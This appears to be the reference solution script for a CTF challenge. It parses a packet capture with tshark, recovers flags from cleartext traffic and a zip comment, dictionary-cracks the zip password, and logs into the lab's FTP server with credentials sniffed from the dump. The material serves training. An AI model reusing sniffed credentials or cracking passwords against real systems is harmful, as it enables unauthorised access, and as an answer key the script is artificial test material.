#!/usr/bin/env python3
"""Эталонное решение «Резервной копии»: печатает все четыре флага, по одному в строке.

Флаги 1–3 извлекаются из дампа public/capture.pcapng; флаг 4 — с живого FTP-сервера
стенда (TASK_HOST/TASK_PORT, по умолчанию 127.0.0.1:2121). Запуск в образе ctf-toolbox
(нужны tshark, словарь John и ftplib). Дамп разбирается без GUI: потоки TCP
собираются из tcp.payload.
"""

from __future__ import annotations

import collections
import ftplib
import io
import os
import re
import subprocess
import zipfile
from pathlib import Path

TASK = Path(__file__).resolve().parent.parent
PCAP = TASK / "public" / "capture.pcapng"
WORDLIST = "/usr/share/john/password.lst"
HOST = os.environ.get("TASK_HOST", "127.0.0.1")
PORT = int(os.environ.get("TASK_PORT", "2121"))
FTP_USER, FTP_PASSWORD = "lighthouse", "Harbor-2026"  # видны в дампе открытым текстом
FLAG = re.compile(rb"BootCTF\{[^}]+\}")


def tcp_streams() -> dict[str, bytes]:
    """Собрать полезную нагрузку TCP по потокам (индекс tcp.stream -> байты)."""
    out = subprocess.run(
        ["tshark", "-r", str(PCAP), "-Y", "tcp.len>0",
         "-T", "fields", "-e", "tcp.stream", "-e", "tcp.payload"],
        capture_output=True, text=True, check=True,
    ).stdout
    streams: dict[str, bytearray] = collections.defaultdict(bytearray)
    for line in out.splitlines():
        parts = line.split("\t")
        if len(parts) == 2 and parts[1]:
            streams[parts[0]] += bytes.fromhex(parts[1].replace(":", ""))
    return {k: bytes(v) for k, v in streams.items()}


def zip_bytes(streams: dict[str, bytes]) -> bytes:
    for data in streams.values():
        if data[:2] == b"PK":
            return data
    raise RuntimeError("архив в дампе не найден")


def flags_1_2_3() -> tuple[str, str, str]:
    streams = tcp_streams()
    # Флаг 1: notes.txt передан открытым текстом.
    f1 = next(FLAG.search(d).group().decode() for d in streams.values()
              if d[:2] != b"PK" and FLAG.search(d))
    archive = zip_bytes(streams)
    zf = zipfile.ZipFile(io.BytesIO(archive))
    # Флаг 2: комментарий архива (не шифруется).
    f2 = zf.comment.decode()
    # Флаг 3: пароль архива — по словарю; затем читаем flag.txt.
    f3 = None
    for word in Path(WORDLIST).read_text(encoding="latin-1").splitlines():
        if word.startswith("#!"):
            continue
        try:
            data = zf.open("flag.txt", pwd=word.encode()).read()
        except (RuntimeError, zipfile.BadZipFile, OSError):
            continue
        if FLAG.search(data):
            f3 = FLAG.search(data).group().decode()
            break
    if f3 is None:
        raise RuntimeError("пароль архива по словарю не подобран")
    return f1, f2, f3


def flag4() -> str:
    # Скрытый флаг: вход теми же данными на живой сервер, каталог archive/old/.
    ftp = ftplib.FTP()
    ftp.connect(HOST, PORT, timeout=10)
    ftp.login(FTP_USER, FTP_PASSWORD)
    ftp.set_pasv(True)
    buf = io.BytesIO()
    ftp.retrbinary("RETR archive/old/handover.txt", buf.write)
    ftp.quit()
    return FLAG.search(buf.getvalue()).group().decode()


def main() -> None:
    f1, f2, f3 = flags_1_2_3()
    print(f1)
    print(f2)
    print(f3)
    print(flag4())


if __name__ == "__main__":
    main()
